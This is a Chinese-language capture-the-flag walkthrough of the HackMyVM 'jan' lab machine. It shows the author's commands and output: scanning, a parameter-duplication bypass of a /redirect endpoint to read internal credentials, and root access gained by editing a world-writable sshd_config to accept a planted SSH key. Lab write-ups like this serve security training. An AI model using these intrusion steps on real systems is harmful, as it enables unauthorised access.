# 0.简介

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=jan
**难度**：绿色
**目标 IP**：192.168.205.136
**本机 IP**：192.168.205.128

# 1.扫描

`nmap`起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A 192.168.205.136
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:40 CST
Nmap scan report for 192.168.205.136
Host is up (0.00023s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
8080/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Mon, 03 Feb 2025 04:40:49 GMT
|     Content-Length: 45
|     Content-Type: text/plain; charset=utf-8
|     Welcome to our Public Server. Maybe Internal.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=2/3%Time=67A048E1%P=x86_64-pc-linux-gnu%r(Get
SF:Request,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Feb\x20202
SF:5\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Server
SF:\.\x20Maybe\x20Internal\.")%r(HTTPOptions,A2,"HTTP/1\.0\x20200\x20OK\r\
SF:nDate:\x20Mon,\x2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Lengt
SF:h:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcom
SF:e\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.")%r(RTSPReq
SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est")%r(FourOhFourRequest,A2,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
SF:2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x
SF:20Public\x20Server\.\x20Maybe\x20Internal\.")%r(Socks5,67,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GenericLines,
SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
SF:%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan,A3,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20he
SF:ader\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20
SF:header");
MAC Address: 08:00:27:3A:49:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.205.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
                                                                           
```

8080端口sT和sS参数探测不出来，所以建议不使用

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/                          
Welcome to our Public Server. Maybe Internal.                                                                                                                                  

```

进行目录爆破

```
┌──(kali㉿kali)-[~/test]
└─$ feroxbuster -u http://192.168.205.136:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
                                                                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.205.136:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, md, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        7w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 
400      GET        1l        3w       24c http://192.168.205.136:8080/redirect
200      GET        2l        2w       16c http://192.168.205.136:8080/robots.txt
[####################] - 54s   598005/598005  0s      found:2       errors:0  
[####################] - 54s   598005/598005  11090/s http://192.168.205.136:8080/         
```

探索一波

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/redirect
Parameter 'url' needed.
                                                                                                                                  
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/robots.txt
/redirect
/credz                                                                                                                                  
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/credz   
Only accessible internally.                                                                                                                                  

```

目前来看出题思路是通过/redirect访问/credz，进行尝试

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/credz   
Only accessible internally.                                                                                                                                  
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
Only accessible internally.                                                                                                                                  
┌──(kali㉿kali)-[~/test]
└─$ curl -I http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
HTTP/1.1 200 OK
Date: Mon, 03 Feb 2025 04:47:07 GMT
Content-Length: 27
Content-Type: text/plain; charset=utf-8

```

这里我测试了挺多绕过检测的方法，我就不写出来了，正确方法是

```
┌──(kali㉿kali)-[~/test]
└─$ curl "http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=192.168.205.136:8080/credz"
                                       
```

返回空白，空白就是有机可寻

```
┌──(kali㉿kali)-[~/test]
└─$ curl "http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=127.0.0.1:8080/credz"
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ curl "http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&url=/credz"          
ssh/EazyLOL                                                                                                                                   

```

登录

```
┌──(kali㉿kali)-[~/test]
└─$ ssh ssh@192.168.205.136
The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.
ssh@192.168.205.136's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ id
uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)

```

# 4.提权

```
jan:~$ ls -al
total 12
drwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .
drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -> /dev/null
-rw-------    1 ssh      ssh             22 Jan 28 09:20 user.txt
jan:~$ sudo -l
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User ssh may run the following commands on jan:
    (root) NOPASSWD: /sbin/service sshd restart

```

大概率是改ssh的配置文件了，看看有没有权限

```
jan:~$ ls -al /etc/ssh/sshd_config
-rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config

```

有权限，那我们生成一个密钥，通过密钥登录root就好了

```
jan:~$ ssh-keygen -t rsa 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ssh/.ssh/id_rsa): 
Created directory '/home/ssh/.ssh'.
Enter passphrase for "/home/ssh/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/ssh/.ssh/id_rsa
Your public key has been saved in /home/ssh/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:FNapkUoVgyB2BhdqurZup7sNDvaCmQhWvV/OC5czxA8 ssh@jan
The key's randomart image is:
+---[RSA 3072]----+
|  +.*o o*+ .     |
| . *  o.ooo      |
|  o .. ..o       |
| o . ...o        |
|. .   . SE       |
|.o   .  ..+      |
|B*    ..+= .     |
|Xo=.   .ooo      |
|oB*o     ..      |
+----[SHA256]-----+

jan:~$ cp .ssh/id_rsa.pub /tmp/authorized_keys
jan:~$ chmod 600 /tmp/authorized_keys 
jan:~$ ls -la /tmp/
total 8
drwxrwxrwt    4 root     root           100 Feb  3 04:56 .
drwxr-xr-x   21 root     root          4096 Jan 28 09:01 ..
drwxrwxrwt    2 root     root            40 Feb  3 04:39 .ICE-unix
drwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix
-rw-------    1 ssh      ssh            561 Feb  3 04:56 authorized_keys

jan:~$ vi /etc/ssh/sshd_config

```

![Image](https://github.com/user-attachments/assets/366ade2a-44b3-49a9-a9b9-407f065a563e)

```
jan:~$ sudo /sbin/service sshd restart
 * Stopping sshd ...                                                                                                             [ ok ]
 * Starting sshd ...                                                                                                             [ ok ]
jan:~$ ssh root@127.0.0.1
/etc/ssh/ssh_config: line 23: Bad configuration option: banner
/etc/ssh/ssh_config: terminating, 1 bad configuration options

```

banner应该也能提权，但是我不管它了

```
jan:~$ vi /etc/ssh/ssh_config

```

![Image](https://github.com/user-attachments/assets/55292c57-7b70-431d-8869-331e678c2397)

```
jan:~$ ssh root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

```

# 5.第二种方法

![Image](https://github.com/user-attachments/assets/2b5ca284-6dd5-4fd9-bc3d-7dd2fee3b048)

🔗https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83

这个方法我没试过，自己尝试一下吧